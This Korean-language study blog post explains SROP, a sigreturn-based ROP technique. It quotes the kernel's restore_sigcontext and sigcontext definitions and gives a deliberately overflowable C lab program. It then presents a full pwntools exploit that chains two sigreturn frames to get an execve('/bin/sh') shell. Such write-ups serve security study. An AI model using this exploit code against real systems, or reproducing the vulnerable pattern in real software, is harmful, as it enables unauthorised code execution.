---
title: "[PWNABLE] SROP"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ SROP( SigReturn-Oriented Programming )는 sigreturn syscall을 사용하는 ROP 기법이다. Signal을 처리하는 과정에서 유저모드 커널모드 간의 상호작용이 일어난다.이 과정을 컨텍스트 스위칭이라고 한다. 유"
date: "2024-05-02"
translation_key: "tistory-b274056796bb"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-SROP"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※**** 

SROP( SigReturn-Oriented Programming )는 sigreturn syscall을 사용하는 ROP 기법이다.

Signal을 처리하는 과정에서 유저모드 <-> 커널모드 간의 상호작용이 일어난다.

이 과정을 컨텍스트 스위칭이라고 한다.

유저모드에서 커널모드로 전환 시 기존 레지스터 값을 포함한 정보들을 유지해야 다시 복귀하고 나서도 다음 기능들을 이어서 할 수가 있다. 

이때 값을 복구해주는 함수는 restore\_sigcontext이다.

```
static bool restore_sigcontext(struct pt_regs *regs,
			       struct sigcontext __user *usc,
			       unsigned long uc_flags)
{
	struct sigcontext sc;
	/* Always make any pending restarted system calls return -EINTR */
	current->restart_block.fn = do_no_restart_syscall;
	if (copy_from_user(&sc, usc, CONTEXT_COPY_SIZE))
		return false;
#ifdef CONFIG_X86_32
	set_user_gs(regs, sc.gs);
	regs->fs = sc.fs;
	regs->es = sc.es;
	regs->ds = sc.ds;
#endif /* CONFIG_X86_32 */
	regs->bx = sc.bx;
	regs->cx = sc.cx;
	regs->dx = sc.dx;
	regs->si = sc.si;
	regs->di = sc.di;
	regs->bp = sc.bp;
	regs->ax = sc.ax;
	regs->sp = sc.sp;
	regs->ip = sc.ip;
#ifdef CONFIG_X86_64
	regs->r8 = sc.r8;
	regs->r9 = sc.r9;
	regs->r10 = sc.r10;
	regs->r11 = sc.r11;
	regs->r12 = sc.r12;
	regs->r13 = sc.r13;
	regs->r14 = sc.r14;
	regs->r15 = sc.r15;
#endif /* CONFIG_X86_64 */
	/* Get CS/SS and force CPL3 */
	regs->cs = sc.cs | 0x03;
	regs->ss = sc.ss | 0x03;
	regs->flags = (regs->flags & ~FIX_EFLAGS) | (sc.flags & FIX_EFLAGS);
	/* disable syscall checks */
	regs->orig_ax = -1;
#ifdef CONFIG_X86_64
	/*
	 * Fix up SS if needed for the benefit of old DOSEMU and
	 * CRIU.
	 */
	if (unlikely(!(uc_flags & UC_STRICT_RESTORE_SS) && user_64bit_mode(regs)))
		force_valid_ss(regs);
#endif
	return fpu__restore_sig((void __user *)sc.fpstate,
			       IS_ENABLED(CONFIG_X86_32));
}
```

해당 코드는 restore\_sigcontext()의 코드이다.

위 코드를 보면 각 레지스터 및 스택의 정보들을 복사하여 가지고 있다가 복귀할 때 다시 설정해준다.

이때 참조하는 구제차가 sigcontext이다.

```
/* __x86_64__: */
struct sigcontext {
  __u64               r8;
  __u64               r9;
  __u64               r10;
  __u64               r11;
  __u64               r12;
  __u64               r13;
  __u64               r14;
  __u64               r15;
  __u64               rdi;
  __u64               rsi;
  __u64               rbp;
  __u64               rbx;
  __u64               rdx;
  __u64               rax;
  __u64               rcx;
  __u64               rsp;
  __u64               rip;
  __u64               eflags;     /* RFLAGS */
  __u16               cs;
  __u16               gs;
  __u16               fs;
  union {
      __u16           ss; /* If UC_SIGCONTEXT_SS */
      __u16           __pad0; /* Alias name for old (!UC_SIGCONTEXT_SS) user-space */
  };
  __u64               err;
  __u64               trapno;
  __u64               oldmask;
  __u64               cr2;
  struct _fpstate __user      *fpstate;   /* Zero when no FPU context */
#  ifdef __ILP32__
  __u32               __fpstate_pad;
#  endif
  __u64               reserved1[8];
};
```

이렇게만 보면 이게 무슨 말인지 이해가 바로 될수도 있지만 대부분 그렇지 않을 것이다.

```
#include <unistd.h>

int gift() {
  asm("pop %rax;"
      "syscall;"
      "ret" );
}

int main()
{
  printf("hello ZZoMb1E!\n");
  char buf[16];
  read(0, buf ,1000);
  
  return 0;
}
```

주어진 코드를 보면 overflow 취약점과 syscall을 위한 함수를 주고있다.

signal을 발생시키는 함수의 rax는 0xf이므로 이를 이용하여 알람을 발생시키고 변조하면 된다.

드림핵을 포함한 각종 블로그들을 참고해봤는데 드림핵에서는 SigreturnFrame()이라는 함수를 사용한다.

이 함수를 이용하면 sigcontext의 구조체 중 원하는 요소만 값을 입력할 수 있게 된다.

먼저 bss영역을 새로운 스택으로 하여 값을 입력받아야 한다.

위 기능을 수행하기 위한 레지스터를 설정하면 다음과 같다.

```
sigframe.rsp = bss
sigframe.rax = 0x0
sigframe.rdi = 0x0
sigframe.rsi = bss
sigframe.rdx = 0x1000
sigframe.rip = syscall
```

이후 입력한 값을 가지고 execve("/bin/sh",0,0)을 구현해야 한다.

```
sig2.rax = 0x3b
sig2.rip = syscall
sig2.rsi = 0x0
sig2.rdi = bss + 0x108
sig2.rdx = 0x0
```

해당 부분의 코드는 위와 같다.

이때 bss+0x108을 해주는 이유는 SigreturnFrame()의 길이가 0xf8이고

여기에 syscall과 0x0이 들어가면서 총 0x108의 버퍼가 /bin/sh/문자열 앞에 들어가기 때문이다.

![](/assets/images/tistory/tistory-b274056796bb/001.png)

위의 값을 페이로드로 작성하면 보내면 스택이 아래와 같이 변경되는 것을 볼 수 있다.

![](/assets/images/tistory/tistory-b274056796bb/002.png)

```
from pwn import*

context.arch = 'x86_64'

p = process("./srop")
e = ELF("./srop")

gadget = next(e.search(asm('pop rax; syscall')))
syscall = next(e.search(asm('syscall')))
bss = e.bss()

sigframe = SigreturnFrame()

sigframe.rsp = bss
sigframe.rax = 0x0
sigframe.rdi = 0x0
sigframe.rsi = bss
sigframe.rdx = 0x1000
sigframe.rip = syscall

payload = b'a'*0x10
payload += b'b'*0x8
payload += p64(gadget)
payload += p64(0xf)
payload += bytes(sigframe)
p.sendline(payload)

sig2 = SigreturnFrame()

sig2.rax = 0x3b
sig2.rip = syscall
sig2.rsi = 0x0
sig2.rdi = bss + 0x108
sig2.rdx = 0x0

payload = p64(gadget)
payload += p64(0xf)
payload += bytes(sig2)
payload += b"/bin/sh\x00"

p.sendline(payload)
```

실행하면 아래와 같이 정상적으로 shell을 얻은 것을 볼 수 있다.

![](/assets/images/tistory/tistory-b274056796bb/003.png)
